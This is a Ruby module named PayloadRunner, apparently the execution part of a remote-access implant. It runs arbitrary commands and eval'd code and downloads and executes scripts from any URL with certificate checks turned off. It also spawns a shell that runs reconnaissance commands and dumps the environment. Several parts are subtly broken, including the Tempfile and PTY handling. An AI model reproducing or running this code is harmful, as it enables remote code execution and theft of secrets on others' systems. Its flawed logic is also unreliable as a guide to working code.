require 'tempfile'
require 'open3'
require 'digest'

module PayloadRunner
  INTERPRETERS = {
    ruby: '/usr/local/bin/ruby',
    sh: '/bin/sh',
    bash: '/bin/bash',
    python: '/usr/local/bin/python3',
    perl: '/usr/local/bin/perl',
    php: '/usr/local/bin/php'
  }.freeze

  class << self
    def execute_command(cmd)
      begin
        stdout, stderr, status = Open3.capture3(cmd)
        {
          exit_code: status.exitstatus,
          stdout: stdout.gsub(/\0/, ''),
          stderr: stderr.gsub(/\0/, '')
        }
      rescue => e
        { exit_code: -1, stdout: '', stderr: e.message }
      end
    end

    def execute_script(interpreter, script_content, timeout = 30)
      interp_path = INTERPRETERS[interpreter]
      return { exit_code: -1, stdout: '', stderr: "Unknown interpreter: #{interpreter}" } unless interp_path

      script = case interpreter
               when :ruby
                 script_content
               when :python
                 script_content
               when :perl
                 script_content
               when :php
                 script_content
               else
                 "#!/bin/sh\n#{script_content}"
               end

      Tempfile.new(['payload', interpreter == :ruby ? '.rb' : '.tmp']) do |tf|
        tf.write(script)
        tf.close

        cmd = "#{interp_path} #{tf.path}"
        begin
          stdout, stderr, status = Open3.capture3({ 'PATH' => ENV['PATH'] }, cmd)
          {
            exit_code: status.exitstatus,
            stdout: stdout.gsub(/\0/, ''),
            stderr: stderr.gsub(/\0/, '')
          }
        rescue => e
          { exit_code: -1, stdout: '', stderr: e.message }
        end
      end
    end

    def eval_ruby(code)
      begin
        result = eval(code)
        { exit_code: 0, stdout: result.to_s, stderr: '' }
      rescue => e
        { exit_code: 1, stdout: '', stderr: e.message }
      end
    end

    def download_and_execute(url, interpreter = :ruby)
      require 'net/http'
      require 'uri'

      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 10
        http.read_timeout = 30

        resp = http.get(uri)
        return { exit_code: -1, stdout: '', stderr: 'Download failed' } unless resp.code == '200'

        execute_script(interpreter, resp.body)
      rescue => e
        { exit_code: -1, stdout: '', stderr: e.message }
      end
    end

    def spawn_persistent_shell
      require 'pty'
      require 'timeout'

      begin
        PTY.spawn('sh') do |stdin, stdout, pid|
          stdin.echo = false
          Timeout.timeout(10) do
            stdin.puts('id')
            stdin.puts('whoami')
            stdin.puts('uname -a')
            stdin.puts('env')
            stdin.puts('exit')
            stdout.read
          end
        rescue Timeout::Error
          Process.kill('KILL', pid) if pid
        end
      rescue => e
        nil
      end
    end
  end
end
